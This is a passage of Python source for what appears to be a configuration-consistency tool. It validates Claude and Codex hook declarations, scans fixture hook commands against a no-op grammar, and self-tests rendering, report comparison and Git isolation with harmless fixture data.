            continue
        needs_command = True
        if event is None:
            continue
        if tier == "native" and (
            (host == "codex" and event not in CODEX_HOOK_EVENTS)
            or (host == "claude" and event in CODEX_ONLY_HOOK_EVENTS)
        ):
            fail("tier-unsupported-event")
        effective_matcher = target.get("matcher")
        if effective_matcher is None:
            effective_matcher = matcher
        if (
            host == "codex"
            and effective_matcher is not None
            and event in CODEX_MATCHER_IGNORED_EVENTS
        ):
            fail("matcher-ignored")
        domain = HOOK_MATCHER_DOMAINS.get((host, event))
        if domain is not None and isinstance(effective_matcher, str):
            selected = _hook_matcher_domain_names(
                host, effective_matcher
            )
            if any(name not in domain for name in selected):
                fail("matcher-domain")
        effective_timeout = target.get("timeout")
        if effective_timeout is None:
            effective_timeout = timeout
        if isinstance(effective_timeout, int) and not isinstance(
            effective_timeout, bool
        ):
            low, high = _hook_timeout_range(host, event)
            if effective_timeout < low or (
                high is not None and effective_timeout > high
            ):
                fail("timeout-out-of-range")
        if host == "claude":
            entry["shared_execution_required"] = True
            if not acknowledged:
                lint("shared-execution-unacknowledged")
        if host == "codex":
            windows = target.get("commandWindows")
            effective_command = target.get("command")
            if effective_command is None:
                effective_command = command
            if (
                isinstance(windows, str)
                and windows != effective_command
            ):
                advise("platform-branch-divergence")
        if (
            hook_class == "reminder"
            and tier == "native"
            and event not in STDOUT_DELIVERING_HOOK_EVENTS
        ):
            advise("hook-output-not-delivered")
    if needs_command and not isinstance(command, str):
        claude_command = targets["claude"].get("command")
        codex_command = targets["codex"].get("command")
        if not isinstance(claude_command, str) or not isinstance(
            codex_command, str
        ):
            fail("field-missing")
    for context in ("enabled-by", "intent"):
        records = fields.get(context) or []
        reason = (
            "enabled-by-malformed"
            if context == "enabled-by"
            else "field-invalid"
        )
        previous: Optional[str] = None
        for item in records:
            at = item.get("line", line)
            date = item.get("date")
            if not _valid_hook_record_date(date):
                fail(reason, at)
            else:
                if previous is not None and date < previous:
                    fail(reason, at)
                previous = date
            if not _valid_hook_record_note(item.get("note")):
                fail(reason, at)
    if hook_class in {"gate", "side-effect"} and enabled is True:
        if not fields.get("enabled-by"):
            entry["opt_in_pending"] = True
            lint("enabled-by-missing")
    if (
        isinstance(matcher, str)
        and HOOK_CLAUDE_LIST_MATCHER_CLASS.fullmatch(matcher) is not None
        and ("|" in matcher or "," in matcher)
        and all(
            targets[host].get("surface") == HOOK_JSON_SURFACES[host]
            for host in ("claude", "codex")
        )
        and targets["claude"].get("matcher") is None
        and targets["codex"].get("matcher") is None
    ):
        advise("matcher-grammar-divergent")
    entry["valid"] = not entry["anomalies"]



def _hook_bullet_start(text: str) -> bool:
    """Report whether a line opens one of the five closed prose bullets."""

    return any(
        text.startswith(f"- {label}: ") for label in HOOK_BULLET_LABELS
    )



def inspect_hook_intents(data: bytes) -> dict[str, Any]:
    """Scan .claude/rules/hooks.md under the closed source-tree/v5 grammar."""

    records = byte_records(data)
    result: dict[str, Any] = {
        "contract": HOOK_INTENT_SCAN_SPEC,
        "valid": False,
        "event_registry": SHARED_HOOK_EVENT_REGISTRY,
        "shared_execution": {"present": False, "date": None, "span": None},
        "entries": [],
        "anomalies": [],
        "lints": [],
    }
    headings: list[tuple[int, Any]] = []
    for index, record in enumerate(records):
        if HOOK_ENTRY_HEADING_PATTERN.fullmatch(record["content"]):
            headings.append((index, record))
    first_entry = headings[0][0] if headings else len(records)
    for index, record in enumerate(records[:first_entry]):
        match = HOOKS_SHARED_EXECUTION_PATTERN.fullmatch(record["content"])
        if match is None:
            continue
        acknowledged_date = match.group(1).decode("ascii")
        if not _valid_hook_record_date(acknowledged_date):
            continue
        result["shared_execution"] = {
            "present": True,
            "date": acknowledged_date,
            "span": _span(record["start"], record["end"]),
        }
        break
    open_preamble: Optional[Any] = None
    for record in records[:first_entry]:
        content = record["content"].strip(b" \t")
        if open_preamble is None:
            if content == HOOK_YAML_FENCE_OPEN:
                open_preamble = record
        elif content == HOOK_YAML_FENCE_CLOSE:
            result["anomalies"].append(
                {
                    "reason": "yaml-block-count",
                    "entry": None,
                    "line": open_preamble["line"],
                }
            )
            open_preamble = None
    if open_preamble is not None:
        result["anomalies"].append(
            {
                "reason": "yaml-block-count",
                "entry": None,
                "line": open_preamble["line"],
            }
        )
    acknowledged = result["shared_execution"]["present"]
    seen_ids: dict[str, int] = {}
    for position, (index, record) in enumerate(headings):
        end_index = (
            headings[position + 1][0]
            if position + 1 < len(headings)
            else len(records)
        )
        entry_id = HOOK_ENTRY_HEADING_PATTERN.fullmatch(
            record["content"]
        ).group(1).decode("ascii")
        entry: dict[str, Any] = {
            "id": entry_id,
            "heading_span": _span(record["start"], record["end"]),
            "entry_span": _span(
                record["start"],
                records[end_index - 1]["end"]
                if end_index <= len(records)
                else len(data),
            ),
            "yaml_span": None,
            "yaml_line": record["line"],
            "bullets": [],
            "fields": {},
            "authenticated": [],
            "event_verified": True,
            "opt_in_pending": False,
            "shared_execution_required": False,
            "valid": False,
            "anomalies": [],
            "advisories": [],
            "lints": [],
        }
        body = records[index + 1 : end_index]
        labels = list(HOOK_BULLET_LABELS)
        offset = 0
        while offset < len(body) and labels:
            item = body[offset]
            try:
                text = item["content"].decode("utf-8")
            except UnicodeError:
                offset += 1
                continue
            prefix = f"- {labels[0]}: "
            if not text.startswith(prefix):
                offset += 1
                continue
            raw = text[len(prefix) :]
            last = offset
            probe = offset + 1
            while probe < len(body):
                following = body[probe]
                if fence_line(following["content"]):
                    break
                try:
                    continuation = following["content"].decode("utf-8")
                except UnicodeError:
                    break
                if not continuation.strip(" \t"):
                    break
                if continuation[0] not in " \t":
                    break
                if _hook_bullet_start(continuation.lstrip(" \t")):
                    break
                raw += "\n" + continuation
                last = probe
                probe += 1
            entry["bullets"].append(
                {
                    "label": labels[0],
                    "span": _span(item["start"], body[last]["end"]),
                    "text": HOOK_BULLET_FOLD_PATTERN.sub(
                        " ", raw
                    ).strip(" \t"),
                }
            )
            labels.pop(0)
            offset = last + 1
        for label in labels:
            entry["anomalies"].append(
                {"reason": "bullet-missing", "line": record["line"]}
            )
        blocks: list[tuple[int, int]] = []
        open_at: Optional[int] = None
        for offset, item in enumerate(body):
            content = item["content"].strip(b" \t")
            if open_at is None:
                if content == HOOK_YAML_FENCE_OPEN:
                    open_at = offset
            elif content == HOOK_YAML_FENCE_CLOSE:
                blocks.append((open_at, offset))
                open_at = None
        if len(blocks) != 1:
            entry["anomalies"].append(
                {"reason": "yaml-block-count", "line": record["line"]}
            )
        else:
            start, stop = blocks[0]
            entry["yaml_span"] = _span(
                body[start]["start"], body[stop]["end"]
            )
            entry["yaml_line"] = body[start]["line"]
            lines: list[tuple[int, str]] = []
            decoded = True
            for item in body[start + 1 : stop]:
                try:
                    lines.append(
                        (item["line"], item["content"].decode("utf-8"))
                    )
                except UnicodeError:
                    decoded = False
            if not decoded:
                entry["anomalies"].append(
                    {"reason": "field-invalid", "line": body[start]["line"]}
                )
            fields, errors = _hook_yaml_fields(lines)
            entry["fields"] = fields
            entry["anomalies"].extend(errors)
            _validate_hook_entry(entry, acknowledged)
        if entry_id in seen_ids:
            entry["anomalies"].append(
                {"reason": "duplicate-id", "line": record["line"]}
            )
            entry["valid"] = False
            result["entries"][seen_ids[entry_id]]["anomalies"].append(
                {
                    "reason": "duplicate-id",
                    "line": headings[seen_ids[entry_id]][1]["line"],
                }
            )
            result["entries"][seen_ids[entry_id]]["valid"] = False
        else:
            seen_ids[entry_id] = position
        result["entries"].append(entry)
    ownership: dict[tuple[str, str, Optional[str]], list[int]] = {}
    for position, entry in enumerate(result["entries"]):
        if not entry["valid"]:
            continue
        fields = entry["fields"]
        targets = fields.get("targets") or {}
        for host in ("claude", "codex"):
            target = targets.get(host) or {}
            if target.get("surface") != HOOK_JSON_SURFACES[host]:
                continue
            matcher = target.get("matcher")
            if matcher is None:
                matcher = fields.get("matcher")
            key = (host, fields.get("event"), matcher)
            ownership.setdefault(key, []).append(position)
    for key, positions in sorted(
        ownership.items(), key=lambda item: str(item[0])
    ):
        if len(positions) < 2:
            continue
        for position in positions:
            entry = result["entries"][position]
            entry["anomalies"].append(
                {
                    "reason": "duplicate-ownership",
                    "line": entry["yaml_line"],
                }
            )
            entry["valid"] = False
    for entry in result["entries"]:
        for token in entry["advisories"]:
            if token not in HOOK_INTENT_ADVISORIES:
                raise ValueError(f"unregistered hook advisory: {token}")
        for token in entry["lints"]:
            if token not in NON_INVALIDATING_INTENT_LINTS:
                raise ValueError(f"unregistered hook lint: {token}")
            result["lints"].append(
                {
                    "reason": token,
                    "entry": entry["id"],
                    "line": entry["yaml_line"],
                }
            )
        for anomaly in entry["anomalies"]:
            if anomaly["reason"] not in INTENT_DOC_ANOMALY_REASONS:
                raise ValueError(
                    "unregistered intent-doc-anomaly reason: "
                    + anomaly["reason"]
                )
            result["anomalies"].append(
                {
                    "reason": anomaly["reason"],
                    "entry": entry["id"],
                    "line": anomaly["line"],
                }
            )
    result["valid"] = not result["anomalies"]
    return result



def _fence_values_from_carrier(data: bytes) -> list[dict[str, Any]]:
    inspection = inspect_hooks_json(data)
    if inspection["parse_error"] is not None:
        raise HooksCarrierError("json-parse-error", "unreadable carrier")
    values: list[dict[str, Any]] = []
    for event in inspection["events"]:
        for group in event["groups"]:
            for handler in group["handlers"]:
                for key in ("command", "commandWindows"):
                    value = handler.get(key)
                    if isinstance(value, str):
                        values.append(
                            {
                                "location": (
                                    f"{event['event']}"
                                    f"[{group['index']}]"
                                    f"[{handler['index']}]"
                                ),
                                "key": key,
                                "value": value,
                            }
                        )
    return values



def _fence_values_from_intents(data: bytes) -> list[dict[str, Any]]:
    values: list[dict[str, Any]] = []
    inside = False
    for record in byte_records(data):
        content = record["content"].strip(b" \t")
        if not inside:
            if content == HOOK_YAML_FENCE_OPEN:
                inside = True
            continue
        if content == HOOK_YAML_FENCE_CLOSE:
            inside = False
            continue
        try:
            text = record["content"].decode("utf-8")
        except UnicodeError:
            continue
        stripped = text.lstrip(" ")
        match = HOOK_YAML_KEY_PATTERN.fullmatch(stripped)
        if match is None or match.group("key") not in {
            "command",
            "commandWindows",
        }:
            continue
        ok, value = _hook_yaml_scalar(match.group("value") or "")
        if ok and isinstance(value, str):
            values.append(
                {
                    "location": f"line {record['line']}",
                    "key": match.group("key"),
                    "value": value,
                }
            )
    return values



def _toml_string_value(text: str) -> str:
    if text.startswith("'"):
        return text[1:-1]
    try:
        value = json.loads(text)
    except json.JSONDecodeError:
        return text
    return value if isinstance(value, str) else text



def _fence_values_from_config_toml(data: bytes) -> list[dict[str, Any]]:
    """Shallow-scan an inline Codex `[hooks]` table; never a TOML parse."""

    values: list[dict[str, Any]] = []
    table = ""
    inside = False
    for record in byte_records(data):
        text = record["content"].decode("utf-8")
        stripped = text.strip(" \t")
        if not stripped or stripped.startswith("#"):
            continue
        header = TOML_TABLE_HEADER_PATTERN.fullmatch(text)
        if header is not None:
            table = header.group("path").strip(" \t")
            first = table.split(".", 1)[0].strip(" \t").strip("\"'")
            inside = first == "hooks"
            continue
        if not inside and TOML_INLINE_HOOKS_PATTERN.match(stripped) is None:
            continue
        for match in TOML_HOOK_COMMAND_PATTERN.finditer(text):
            values.append(
                {
                    "location": (
                        f"[{table}] line {record['line']}"
                        if table
                        else f"line {record['line']}"
                    ),
                    "key": match.group("key"),
                    "value": _toml_string_value(match.group("value")),
                }
            )
    return values



def scan_hook_fence(root: Path) -> dict[str, Any]:
    """Assert the closed no-op grammar over every fixture hook command."""

    base = Path(root)
    if not base.is_dir():
        raise ValueError(f"hook fence root is not a directory: {base}")
    checked: list[str] = []
    unreadable: list[str] = []
    violations: list[dict[str, Any]] = []
    scanned = 0
    candidates: list[Path] = []
    for parent, directories, names in os.walk(base, followlinks=False):
        directories[:] = sorted(
            name
            for name in directories
            if name not in {".git", "__pycache__"}
            and not Path(parent, name).is_symlink()
        )
        candidates.extend(Path(parent, name) for name in sorted(names))
    for path in candidates:
        if path.is_symlink() or not path.is_file():
            continue
        relative = path.relative_to(base).as_posix()
        try:
            data = path.read_bytes()
        except OSError:
            unreadable.append(relative)
            continue
        if relative.endswith(HOOK_FENCE_CARRIER_NAMES):
            reader = _fence_values_from_carrier
        elif relative.endswith(HOOK_FENCE_TOML_CARRIER):
            reader = _fence_values_from_config_toml
        elif relative.endswith(HOOK_INTENT_DOCUMENT):
            reader = _fence_values_from_intents
        else:
            continue
        checked.append(relative)
        try:
            values = reader(data)
        except (HooksCarrierError, UnicodeError):
            unreadable.append(relative)
            continue
        scanned += len(values)
        for item in values:
            if HOOK_FENCE_COMMAND_PATTERN.fullmatch(item["value"]) is None:
                violations.append(dict(item, path=relative))
    return {
        "contract": HOOK_FENCE_SCAN_SPEC,
        "root": str(base),
        "ok": not violations,
        "checked": checked,
        "unreadable": unreadable,
        "values": scanned,
        "violations": violations,
    }



def self_test_require(condition: Any, detail: str) -> None:
    if not condition:
        raise ValueError(f"self-test failed: {detail}")



def self_test_expect_value_error(operation: Any, detail: str) -> None:
    try:
        operation()
    except ValueError:
        return
    raise ValueError(f"self-test failed: {detail} was accepted")


@contextmanager
def isolated_self_test_git_environment(
    root: Path,
) -> Iterable[dict[str, Path]]:
    """Run self-test Git commands without ambient config or hooks."""

    isolation_root = root / "git-process-isolation"
    isolation_root.mkdir()
    empty_global = isolation_root / "global.gitconfig"
    empty_global.write_bytes(b"")
    hooks = isolation_root / "hooks"
    template = isolation_root / "template"
    hooks.mkdir()
    template.mkdir()

    poison_hooks = isolation_root / "poison-hooks"
    poison_hooks.mkdir()
    poison_hook = poison_hooks / "pre-commit"
    poison_hook.write_bytes(b"#!/bin/sh\nexit 97\n")
    try:
        poison_hook.chmod(0o755)
    except OSError:
        pass
    system_config = isolation_root / "system.gitconfig"
    system_config.write_text(
        "[user]\n"
        "\tname = Ambient Poison\n"
        "[commit]\n"
        "\tgpgsign = true\n"
        "[core]\n"
        f"\thooksPath = {poison_hooks.as_posix()}\n",
        encoding="utf-8",
    )

    exact_keys = {
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
        "GIT_AUTHOR_EMAIL",
        "GIT_AUTHOR_NAME",
        "GIT_CEILING_DIRECTORIES",
        "GIT_COMMITTER_EMAIL",
        "GIT_COMMITTER_NAME",
        "GIT_COMMON_DIR",
        "GIT_CONFIG",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_GLOBAL",
        "GIT_CONFIG_NOSYSTEM",
        "GIT_CONFIG_PARAMETERS",
        "GIT_CONFIG_SYSTEM",
        "GIT_DIR",
        "GIT_DISCOVERY_ACROSS_FILESYSTEM",
        "GIT_INDEX_FILE",
        "GIT_OBJECT_DIRECTORY",
        "GIT_TEMPLATE_DIR",
        "GIT_TERMINAL_PROMPT",
        "GIT_WORK_TREE",
    }
    inherited_keys = {
        key
        for key in os.environ
        if (
            key in exact_keys
            or key.startswith("GIT_CONFIG_KEY_")
            or key.startswith("GIT_CONFIG_VALUE_")
        )
    }
    inherited = {key: os.environ[key] for key in inherited_keys}
    try:
        for key in inherited_keys:
            os.environ.pop(key, None)
        os.environ.update(
            {
                "GIT_CONFIG_NOSYSTEM": "1",
                "GIT_CONFIG_SYSTEM": str(system_config),
                "GIT_CONFIG_GLOBAL": str(empty_global),
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "core.hooksPath",
                "GIT_CONFIG_VALUE_0": str(hooks),
                "GIT_TEMPLATE_DIR": str(template),
                "GIT_TERMINAL_PROMPT": "0",
                "GIT_AUTHOR_NAME": "Bridge Self Test",
                "GIT_AUTHOR_EMAIL": "bridge-self-test@example.invalid",
                "GIT_COMMITTER_NAME": "Bridge Self Test",
                "GIT_COMMITTER_EMAIL": "bridge-self-test@example.invalid",
            }
        )
        yield {
            "global": empty_global,
            "system": system_config,
            "hooks": hooks,
            "template": template,
        }
    finally:
        for key in list(os.environ):
            if (
                key in exact_keys
                or key.startswith("GIT_CONFIG_KEY_")
                or key.startswith("GIT_CONFIG_VALUE_")
            ):
                os.environ.pop(key, None)
        os.environ.update(inherited)



def run_self_test() -> dict[str, Any]:
    checks: list[str] = []
    control_hints = get_type_hints(control_comment_anomalies)
    self_test_require(
        "protected" in control_hints,
        "runtime resolution of Mapping annotations",
    )
    checks.append("runtime-type-annotations")
    source_syntax = ast.parse(
        Path(__file__).read_text(encoding="utf-8")
    )
    self_test_require(
        not any(
            isinstance(node, ast.Assert)
            for node in ast.walk(source_syntax)
        ),
        "assert-free self-test implementation",
    )
    checks.append("assert-independent-self-test")
    self_test_require(
        normalize_n(b"a  \r\nb\t\r\n\r\n") == b"a\nb\n",
        "normalization N",
    )
    checks.append("normalize-n")
    records = byte_records(b"a\r\nb\rc\nlast")
    self_test_require(
        [record["content"] for record in records]
        == [b"a", b"b", b"c", b"last"],
        "byte record contents",
    )
    self_test_require(
        [(record["start"], record["end"]) for record in records]
        == [(0, 3), (3, 5), (5, 7), (7, 11)],
        "byte record offsets",
    )
    checks.append("byte-offset-lines")

    agents_bytes = (
        b"manual-before\r\n"
        b"<!-- bridge:managed:start id=entry source=CLAUDE.md -->\r\n"
        b"# Shared  \r\n"
        b"<!-- bridge:managed:end -->\r\n"
        b"manual-after\r\n"
    )
    block_map = inspect_managed_blocks(
        agents_bytes,
        entry_source="CLAUDE.md",
        owned_ids=["entry"],
    )
    self_test_require(block_map["trustworthy"], "managed block map")
    self_test_require(
        len(block_map["blocks"]) == 1,
        "managed block count",
    )
    self_test_require(
        block_map["blocks"][0]["body_start"]
        == len(
            b"manual-before\r\n"
            b"<!-- bridge:managed:start id=entry source=CLAUDE.md -->\r\n"
        ),
        "managed block body offset",
    )
    self_test_require(
        b"".join(
            agents_bytes[span["start"] : span["end"]]
            for span in block_map["manual_spans"]
        )
        == b"manual-before\r\nmanual-after\r\n",
        "manual span preservation",
    )
    checks.append("managed-block-byte-map")

    anomalous_agents = (
        b"<!-- bridge:managed:start id=entry source=CLAUDE.md mode=semantic -->\n"
        b"<!-- bridge:managed:end -->\n"
        b"<!-- bridge:managed:start id=entry source=wrong.md -->\n"
        b"x\n"
        b"<!-- bridge:managed:end -->\n"
        b"<!-- bridge:managed:start id=entry source=CLAUDE.md -->\n"
        b"y\n"
        b"<!-- bridge:managed:end -->\n"
    )
    anomaly_map = inspect_managed_blocks(
        anomalous_agents, entry_source="CLAUDE.md"
    )
    anomaly_kinds = {
        item["kind"] for item in anomaly_map["anomalies"]
    }
    self_test_require(
        {
            "legacy-managed-mode",
            "orphan-end",
            "source-mismatch",
            "duplicate-id",
        }
        <= anomaly_kinds,
        "managed block anomaly registry",
    )
    self_test_require(
        not anomaly_map["trustworthy"],
        "anomalous managed block trust",
    )
    checks.append("managed-block-anomalies")

    claude_regions = (
        b"before\n"
        b"<!-- bridge:claude-only:start -->\n"
        b"hidden\n"
        b"<!-- bridge:claude-only:end -->\n"
        b"between\n"
        b"<!-- bridge:claude-only:start -->\n"
        b"unclosed\n"
    )
    claude_map = inspect_claude_only(claude_regions)
    self_test_require(
        len(claude_map["spans"]) == 1,
        "Claude-only closed span count",
    )
    self_test_require(
        claude_map["anomalies"][0]["kind"] == "unclosed-claude-only",
        "Claude-only unclosed anomaly",
    )
    checks.append("claude-only-spans")

    active_source = (
        b"`@inline/one`\n"
        b"``multi\n @inline/two``\n"
        b"```\n@fenced/one\n```\n"
        b"Shared(@not-active/no-leading-space)\n"
        b" @active/rules.md\n"
    )
    imports = active_imports(active_source)
    self_test_require(
        [item["token"] for item in imports] == ["@active/rules.md"],
        "active import code-boundary filtering",
    )
    self_test_require(
        active_source[imports[0]["start"] : imports[0]["end"]]
        == b"@active/rules.md",
        "active import source offsets",
    )
    checks.append("active-import-spans")

    protected_import_source = (
        b"<!-- bridge:intent 2026-07-23 Initial shared intent -->\n"
        b"<!-- bridge:intent 2026-07-24 Shared entry -->\n"
        b"<!-- bridge:claude-only:start -->\n"
        b"`excluded opener\n"
        b"<!-- bridge:claude-only:end -->\n"
        b" @active/protected-boundary.md\n"
        b"`unmatched shared delimiter\n"
    )
    protected_import_render = render_agents_unit(
        protected_import_source,
        kind="entry",
        paths=None,
    )
    self_test_require(
        [
            item["token"]
            for item in protected_import_render["active_imports"]
        ]
        == ["@active/protected-boundary.md"],
        "active imports after protected-span projection",
    )
    protected_fence_rule = (
        b"---\n"
        b"paths:\n"
        b"  - \"docs/**/*\"\n"
        b"```\n"
        b"---\n"
        b"<!-- bridge:intent 2026-07-24 Shared docs -->\n"
        b" @active/frontmatter-boundary.md\n"
    )
    protected_fence_render = render_agents_unit(
        protected_fence_rule,
        kind="rule",
        paths=["docs/**/*"],
    )
    self_test_require(
        [
            item["token"]
            for item in protected_fence_render["active_imports"]
        ]
        == ["@active/frontmatter-boundary.md"],
        "active imports after protected frontmatter projection",
    )
    checks.append("active-import-protected-projection")

    rule_source = (
        b"---\r\n"
        b"paths:\r\n"
        b"  - \"docs/**/*\"\r\n"
        b"---\r\n"
        b"<!-- bridge:intent 2026-07-24 Keep docs guidance shared -->\r\n"
        b"\r\n"
        b"# Docs  \r\n"
        b"\r\n"
        b"<!-- bridge:claude-only:start -->\r\n"
        b"Claude-only detail.\r\n"
        b"<!-- bridge:claude-only:end -->\r\n"
        b"Use `@literal/example` in examples.\r\n"
    )
    rendered_rule = render_agents_unit(
        rule_source, kind="rule", paths=["docs/**/*"]
    )
    expected_render = (
        b"Applies only while reading or editing files that match at least "
        b"one of these source globs: `docs/**/*`. (bridge:pv2)\n\n"
        b"# Docs\n\n"
        b"Use `@literal/example` in examples.\n"
    )
    self_test_require(
        rendered_rule["valid"],
        f"valid v4 rule render: {rendered_rule['errors']}",
    )
    self_test_require(
        base64.b64decode(rendered_rule["rendered"]["base64"])
        == expected_render,
        "v4 rendered bytes",
    )
    self_test_require(
        {
            span["kind"] for span in rendered_rule["protected_spans"]
        }
        >= {"frontmatter", "intent", "claude-only", "leading-blank"},
        "v4 protected span kinds",
    )
    self_test_require(
        any(
            item["kind"] == "generated-preamble"
            for item in rendered_rule["origin_map"]
        ),
        "v4 generated preamble origin",
    )
    parsed_preamble = parse_preamble(expected_render)
    self_test_require(
        parsed_preamble
        == {
            "present": True,
            "valid": True,
            "paths": ["docs/**/*"],
            "end": len(expected_render.split(b"# Docs", 1)[0]),
        },
        "pv2 preamble round trip",
    )
    checks.append("render-v4-origin-map")
    checks.append("preamble-pv2-roundtrip")

    blocked_render = render_agents_unit(
        b"<!-- bridge:intent 2026-07-24 Shared entry -->\n"
        b"# Entry\n\n"
        b" @shared/import.md\n",
        kind="entry",
        paths=None,
    )
    self_test_require(
        not blocked_render["valid"],
        "active import blocks v4 render",
    )
    self_test_require(
        blocked_render["active_imports"][0]["token"]
        == "@shared/import.md",
        "active import blocker token",
    )
    unknown_control = render_agents_unit(
        b"<!-- bridge:unknown value -->\n# Entry\n",
        kind="entry",
        paths=None,
    )
    self_test_require(
        not unknown_control["valid"],
        "unknown control comment blocks render",
    )
    self_test_require(
        unknown_control["errors"][0]["kind"]
        == "unknown-control-comment",
        "unknown control comment blocker",
    )
    checks.append("render-v4-blockers")

    for unit_kind in ("entry", "rule"):
        bom_render = render_agents_unit(
            b"\xef\xbb\xbf"
            b"<!-- bridge:intent 2026-07-24 Shared guidance -->\n"
            b"# Shared\n",
            kind=unit_kind,
            paths=None,
        )
        self_test_require(
            not bom_render["valid"]
            and any(
                error["kind"] == "leading-utf8-bom"
                for error in bom_render["errors"]
            ),
            f"leading UTF-8 BOM blocks {unit_kind}",
        )
    checks.append("entry-rule-leading-bom")

    self_test_require(
        not valid_intent_line(
            b"<!-- bridge:intent 2026-07-24 \vleading -->"
        ),
        "leading ASCII whitespace in intent",
    )
    self_test_require(
        not valid_intent_line(
            b"<!-- bridge:intent 2026-07-24 trailing\f -->"
        ),
        "trailing ASCII whitespace in intent",
    )
    self_test_require(
        valid_intent_line(
            "<!-- bridge:intent 2026-07-24 \u00a0Unicode space -->".encode(
                "utf-8"
            )
        ),
        "non-ASCII intent boundary whitespace",
    )
    reverse_intents = render_agents_unit(
        b"<!-- bridge:intent 2026-07-24 Newer -->\n"
        b"<!-- bridge:intent 2026-07-23 Older -->\n"
        b"# Shared\n",
        kind="entry",
        paths=None,
    )
    self_test_require(
        not reverse_intents["valid"]
        and any(
            error["kind"] == "intent-not-oldest-first"
            for error in reverse_intents["errors"]
        ),
        "intent records oldest-first ordering",
    )
    checks.append("intent-order-ascii-whitespace")

    self_test_require(
        "paths[0]:universal-no-op" in validate_render_paths(["**/*"]),
        "universal render path guard",
    )
    self_test_require(
        "paths[1]:duplicate"
        in validate_render_paths(["docs/**/*", "docs/**/*"]),
        "duplicate render path guard",
    )
    self_test_require(
        "paths[0]:unclosed-bracket"
        in validate_render_paths(["src/[a"]),
        "unclosed bracket render path guard",
    )
    checks.append("paths-closed-guards")

    budget = check_agents_budget(b"x" * 28, 32)
    self_test_require(
        budget["fits"] and budget["warning_threshold"],
        "budget warning threshold",
    )
    self_test_require(
        not check_agents_budget(b"x", 0)["fits"],
        "zero budget",
    )
    self_test_require(
        not check_agents_budget(b"x" * 33, 32)["fits"],
        "exceeded budget",
    )
    checks.append("agents-budget")

    self_test_require(
        diff_shape(b"a\n", b"a\nb\n") == "additions-only",
        "additions-only diff shape",
    )
    self_test_require(
        diff_shape(b"a\nb\n", b"a\n") == "deletions-only",
        "deletions-only diff shape",
    )
    self_test_require(
        diff_shape(b"a\n", b"b\n") == "both",
        "bidirectional diff shape",
    )
    checks.append("diff-shape")

    with ExitStack() as stack:
        temp = stack.enter_context(
            tempfile.TemporaryDirectory(prefix="bridge-sentinel-")
        )
        root = Path(temp)
        git_isolation = stack.enter_context(
            isolated_self_test_git_environment(root)
        )
        master = root / "master"
        copy = root / "copy"
        master.mkdir()
        copy.mkdir()
        (master / "same").write_bytes(b"same\n")
        (copy / "same").write_bytes(b"same\n")
        byte_comparison = compare_trees(master, copy)
        self_test_require(
            byte_comparison["equal"],
            "equal filesystem tree comparison",
        )
        self_test_require(
            byte_comparison["mode_checked"] is False,
            "filesystem comparison mode boundary",
        )
        (copy / "extra").write_bytes(b"extra\n")
        self_test_require(
            compare_trees(master, copy)["shape"] == "additions-only",
            "filesystem addition shape",
        )
        produced = root / "produced.md"
        expected = root / "expected.md"
        findings = (
            "## Findings\n\n"
            + FINDINGS_HEADER
            + "\n"
            + FINDINGS_SEPARATOR
            + "\n"
            "| skills | demo | codex | in-sync | - | native | - |\n\n"
        )

        def produced_report(observations: str) -> str:
            return (
                "# Bridge Sentinel Report\n\n"
                "- project: demo\n"
                "- scan root: .\n"
                "- scope excludes: (none)\n"
                "- date: 2026-07-24\n"
                "- spec: report/v5\n"
                "- scan surfaces: agents-md, hooks, skills\n"
                "- onboarding: onboarded\n\n"
                + findings
                + "## Observations\n\n"
                + observations
                + "\n\n## Evidence and notes\n\nSelf-test evidence.\n\n"
                "## Local environment notes\n\nSelf-test environment.\n"
            )

        def expected_report(
            observations: str, activation_header: str
        ) -> str:
            return (
                "- expectation: report/v5\n"
                "- scan root: .\n"
                "- scope excludes: (none)\n"
                f"- activation profile: {activation_header}\n"
                "- onboarding: onboarded\n\n"
                + findings
                + "## Observations\n\n"
                + observations
                + "\n"
            )

        produced.write_text(
            produced_report(
                "- mode-limited: .claude/skills/demo/tool "
                "(worktree-mode-unobservable)\n"
                "- codex-root-unresolved: . (effective-root-unknown)"
            ),
            encoding="utf-8",
        )
        expected.write_text(
            expected_report("- (none)", "environment-dependent"),
            encoding="utf-8",
        )
        self_test_require(
            compare_expectations(produced, expected)["pass"],
            "environment-dependent expectation comparison",
        )

        invalid_version = root / "invalid-version.md"
        invalid_version.write_text(
            produced.read_text(encoding="utf-8").replace(
                "- spec: report/v5",
                "- spec: report/v4",
            ),
            encoding="utf-8",
        )
        self_test_expect_value_error(
            lambda: compare_expectations(invalid_version, expected),
            "non-v5 produced report",
        )
        missing_section = root / "missing-section.md"
        missing_section.write_text(
            produced.read_text(encoding="utf-8").replace(
                "\n## Local environment notes\n\nSelf-test environment.\n",
                "\n",
            ),
            encoding="utf-8",
        )
        self_test_expect_value_error(
            lambda: compare_expectations(missing_section, expected),
            "produced report missing a required section",
        )
        malformed_row = root / "malformed-row.md"
        malformed_row.write_text(
            produced.read_text(encoding="utf-8").replace(
                "| skills | demo | codex | in-sync | - | native | - |",
                "|skills| demo | codex | in-sync | - | native | - |",
            ),
            encoding="utf-8",
        )
        self_test_expect_value_error(
            lambda: compare_expectations(malformed_row, expected),
            "Findings row without exact padding",
        )
        prose_observation = root / "prose-observation.md"
        prose_observation.write_text(
            produced_report("observation prose is not a list item"),
            encoding="utf-8",
        )
        self_test_expect_value_error(
            lambda: compare_expectations(prose_observation, expected),
            "non-observation prose in Observations",
        )
        checks.append("report-v5-strict-grammar")

        activation_profile = root / "activation-profile.json"
        activation_profile.write_text(
            json.dumps(
                {
                    "version": "activation-fixture/v2",
                    "root_markers": [".git"],
                    "fallback_filenames": ["AGENTS.fallback.md"],
                    "project_doc_max_bytes": 32768,
                    "budget_source": "resolved",
                    "codex_project_trust": "unknown",
                    "codex_hooks_feature": "unknown",
                }
            )
            + "\n",
            encoding="utf-8",
        )
        pinned_produced = root / "pinned-produced.md"
        pinned_expected = root / "pinned-expected.md"
        pinned_produced.write_text(
            produced_report(
                "- codex-effective-budget: AGENTS.md "
                "(project_doc_max_bytes=32768; source=resolved)\n"
                "- mode-limited: .claude/skills/demo/tool "
                "(worktree-mode-unobservable)"
            ),
            encoding="utf-8",
        )
        pinned_expected.write_text(
            expected_report(
                "- codex-effective-budget: AGENTS.md "
                "(project_doc_max_bytes=32768; source=resolved)",
                "activation-profile.json",
            ),
            encoding="utf-8",
        )
        pinned_result = compare_expectations(
            pinned_produced, pinned_expected
        )
        self_test_require(
